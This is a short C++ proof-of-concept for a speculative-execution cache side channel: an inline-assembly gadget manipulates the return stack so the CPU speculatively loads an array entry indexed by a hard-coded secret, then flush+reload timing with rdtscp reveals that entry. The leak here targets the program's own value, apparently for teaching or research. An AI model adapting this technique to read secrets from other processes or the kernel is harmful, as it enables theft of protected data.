#include "util.hpp"

using namespace std;

char array[256*256];
char temp;
char secret = 112;

void gadget(){
	__asm__(
	"pop %rdi;"
	"pop %rdi;"	
	"pop %rbp;"
	"clflush (%rsp);"
	"cpuid;"
	"retq;");
}

void speculative(){
	gadget();
	temp &= array[secret * 256];
}

inline void time(int i) {
	unsigned int dummy;
	auto t1 = __rdtscp(&dummy);
	auto junk = array[i*256];
	auto t2 = __rdtscp(&dummy);
	cout << "Accessed value: " << i << " time: " << t2-t1 << endl;
}

int main(){
	// Flush array from caches
	for (int i = 0; i < 256; i++){
		clflush(&array[i*256]);
	}

	// Run code which speculatively loads data into cache
	speculative();

	cout << "Secret value is " << (int)secret << ". That value should have a lower access time." << endl;

	// Choose measured values randomly to prevent CPU prefetching.
	time(5);
	time(63);
	time(102);
	time(112);
	time(145);
	time(204);
	time(243);
	
	return 0;
}